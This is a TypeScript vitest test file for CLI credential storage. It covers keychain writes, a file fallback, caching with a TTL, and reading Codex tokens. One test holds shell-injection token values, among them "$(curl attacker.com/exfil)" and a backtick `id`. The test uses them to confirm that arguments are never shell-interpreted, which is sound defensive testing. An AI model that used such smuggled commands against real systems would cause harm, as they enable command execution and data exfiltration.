import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

const execFileSyncMock = vi.fn();
const CLI_CREDENTIALS_CACHE_TTL_MS = 15 * 60 * 1000;
let readClaudeCliCredentialsCached: typeof import("./cli-credentials.js").readClaudeCliCredentialsCached;
let resetCliCredentialCachesForTest: typeof import("./cli-credentials.js").resetCliCredentialCachesForTest;
let writeClaudeCliKeychainCredentials: typeof import("./cli-credentials.js").writeClaudeCliKeychainCredentials;
let writeClaudeCliCredentials: typeof import("./cli-credentials.js").writeClaudeCliCredentials;
let readCodexCliCredentials: typeof import("./cli-credentials.js").readCodexCliCredentials;

function mockExistingClaudeKeychainItem() {
  execFileSyncMock.mockImplementation((file: unknown, args: unknown) => {
    const argv = Array.isArray(args) ? args.map(String) : [];
    if (String(file) === "security" && argv.includes("find-generic-password")) {
      return JSON.stringify({
        claudeAiOauth: {
          accessToken: "old-access",
          refreshToken: "old-refresh",
          expiresAt: Date.now() + 60_000,
        },
      });
    }
    return "";
  });
}

function getAddGenericPasswordCall() {
  return execFileSyncMock.mock.calls.find(
    ([binary, args]) =>
      String(binary) === "security" &&
      Array.isArray(args) &&
      (args as unknown[]).map(String).includes("add-generic-password"),
  );
}

async function readCachedClaudeCliCredentials(allowKeychainPrompt: boolean) {
  return readClaudeCliCredentialsCached({
    allowKeychainPrompt,
    ttlMs: CLI_CREDENTIALS_CACHE_TTL_MS,
    platform: "darwin",
    execFileSync: execFileSyncMock,
  });
}

function createJwtWithExp(expSeconds: number): string {
  const encode = (value: Record<string, unknown>) =>
    Buffer.from(JSON.stringify(value)).toString("base64url");
  return `${encode({ alg: "RS256", typ: "JWT" })}.${encode({ exp: expSeconds })}.signature`;
}

describe("cli credentials", () => {
  beforeAll(async () => {
    ({
      readClaudeCliCredentialsCached,
      resetCliCredentialCachesForTest,
      writeClaudeCliKeychainCredentials,
      writeClaudeCliCredentials,
      readCodexCliCredentials,
    } = await import("./cli-credentials.js"));
  });

  beforeEach(() => {
    vi.useFakeTimers();
  });

  afterEach(() => {
    vi.useRealTimers();
    execFileSyncMock.mockClear().mockImplementation(() => undefined);
    delete process.env.CODEX_HOME;
    resetCliCredentialCachesForTest();
  });

  it("updates the Claude Code keychain item in place", async () => {
    mockExistingClaudeKeychainItem();

    const ok = writeClaudeCliKeychainCredentials(
      {
        access: "new-access",
        refresh: "new-refresh",
        expires: Date.now() + 60_000,
      },
      { execFileSync: execFileSyncMock },
    );

    expect(ok).toBe(true);

    // Verify execFileSync was called with array args (no shell interpretation)
    expect(execFileSyncMock).toHaveBeenCalledTimes(2);
    const addCall = getAddGenericPasswordCall();
    expect(addCall?.[0]).toBe("security");
    expect((addCall?.[1] as string[] | undefined) ?? []).toContain("-U");
  });

  it("prevents shell injection via untrusted token payload values", async () => {
    const cases = [
      {
        access: "x'$(curl attacker.com/exfil)'y",
        refresh: "safe-refresh",
        expectedPayload: "x'$(curl attacker.com/exfil)'y",
      },
      {
        access: "safe-access",
        refresh: "token`id`value",
        expectedPayload: "token`id`value",
      },
    ] as const;

    for (const testCase of cases) {
      execFileSyncMock.mockClear();
      mockExistingClaudeKeychainItem();

      const ok = writeClaudeCliKeychainCredentials(
        {
          access: testCase.access,
          refresh: testCase.refresh,
          expires: Date.now() + 60_000,
        },
        { execFileSync: execFileSyncMock },
      );

      expect(ok).toBe(true);

      // Token payloads must remain literal in argv, never shell-interpreted.
      const addCall = getAddGenericPasswordCall();
      const args = (addCall?.[1] as string[] | undefined) ?? [];
      const wIndex = args.indexOf("-w");
      const passwordValue = args[wIndex + 1];
      expect(passwordValue).toContain(testCase.expectedPayload);
      expect(addCall?.[0]).toBe("security");
    }
  });

  it("falls back to the file store when the keychain update fails", async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-"));
    const credPath = path.join(tempDir, ".claude", ".credentials.json");

    fs.mkdirSync(path.dirname(credPath), { recursive: true, mode: 0o700 });
    fs.writeFileSync(
      credPath,
      `${JSON.stringify(
        {
          claudeAiOauth: {
            accessToken: "old-access",
            refreshToken: "old-refresh",
            expiresAt: Date.now() + 60_000,
          },
        },
        null,
        2,
      )}\n`,
      "utf8",
    );

    const writeKeychain = vi.fn(() => false);

    const ok = writeClaudeCliCredentials(
      {
        access: "new-access",
        refresh: "new-refresh",
        expires: Date.now() + 120_000,
      },
      {
        platform: "darwin",
        homeDir: tempDir,
        writeKeychain,
      },
    );

    expect(ok).toBe(true);
    expect(writeKeychain).toHaveBeenCalledTimes(1);

    const updated = JSON.parse(fs.readFileSync(credPath, "utf8")) as {
      claudeAiOauth?: {
        accessToken?: string;
        refreshToken?: string;
        expiresAt?: number;
      };
    };

    expect(updated.claudeAiOauth?.accessToken).toBe("new-access");
    expect(updated.claudeAiOauth?.refreshToken).toBe("new-refresh");
    expect(updated.claudeAiOauth?.expiresAt).toBeTypeOf("number");
  });

  it("caches Claude Code CLI credentials within the TTL window", async () => {
    execFileSyncMock.mockImplementation(() =>
      JSON.stringify({
        claudeAiOauth: {
          accessToken: "cached-access",
          refreshToken: "cached-refresh",
          expiresAt: Date.now() + 60_000,
        },
      }),
    );

    vi.setSystemTime(new Date("2025-01-01T00:00:00Z"));

    const first = await readCachedClaudeCliCredentials(true);
    const second = await readCachedClaudeCliCredentials(false);

    expect(first).toBeTruthy();
    expect(second).toEqual(first);
    expect(execFileSyncMock).toHaveBeenCalledTimes(1);
  });

  it("refreshes Claude Code CLI credentials after the TTL window", async () => {
    execFileSyncMock.mockImplementation(() =>
      JSON.stringify({
        claudeAiOauth: {
          accessToken: `token-${Date.now()}`,
          refreshToken: "refresh",
          expiresAt: Date.now() + 60_000,
        },
      }),
    );

    vi.setSystemTime(new Date("2025-01-01T00:00:00Z"));

    const first = await readCachedClaudeCliCredentials(true);

    vi.advanceTimersByTime(CLI_CREDENTIALS_CACHE_TTL_MS + 1);

    const second = await readCachedClaudeCliCredentials(true);

    expect(first).toBeTruthy();
    expect(second).toBeTruthy();
    expect(execFileSyncMock).toHaveBeenCalledTimes(2);
  });

  it("reads Codex credentials from keychain when available", async () => {
    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-codex-"));
    process.env.CODEX_HOME = tempHome;
    const expSeconds = Math.floor(Date.parse("2026-03-23T00:48:49Z") / 1000);

    execFileSyncMock.mockImplementation((_binary: unknown, args: unknown) => {
      const argv = Array.isArray(args) ? args.map(String) : [];
      expect(argv).toContain("Codex Auth");
      expect(argv.some((a: string) => a.startsWith("cli|"))).toBe(true);
      return JSON.stringify({
        tokens: {
          access_token: createJwtWithExp(expSeconds),
          refresh_token: "keychain-refresh",
        },
        last_refresh: "2026-01-01T00:00:00Z",
      });
    });

    const creds = readCodexCliCredentials({ platform: "darwin", execFileSync: execFileSyncMock });

    expect(creds).toMatchObject({
      access: createJwtWithExp(expSeconds),
      refresh: "keychain-refresh",
      provider: "openai-codex",
      expires: expSeconds * 1000,
    });
  });

  it("falls back to Codex auth.json when keychain is unavailable", async () => {
    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-codex-"));
    process.env.CODEX_HOME = tempHome;
    const expSeconds = Math.floor(Date.parse("2026-03-24T12:34:56Z") / 1000);
    execFileSyncMock.mockImplementation(() => {
      throw new Error("not found");
    });

    const authPath = path.join(tempHome, "auth.json");
    fs.mkdirSync(tempHome, { recursive: true, mode: 0o700 });
    fs.writeFileSync(
      authPath,
      JSON.stringify({
        tokens: {
          access_token: createJwtWithExp(expSeconds),
          refresh_token: "file-refresh",
        },
      }),
      "utf8",
    );

    const creds = readCodexCliCredentials({ execFileSync: execFileSyncMock });

    expect(creds).toMatchObject({
      access: createJwtWithExp(expSeconds),
      refresh: "file-refresh",
      provider: "openai-codex",
      expires: expSeconds * 1000,
    });
  });
});
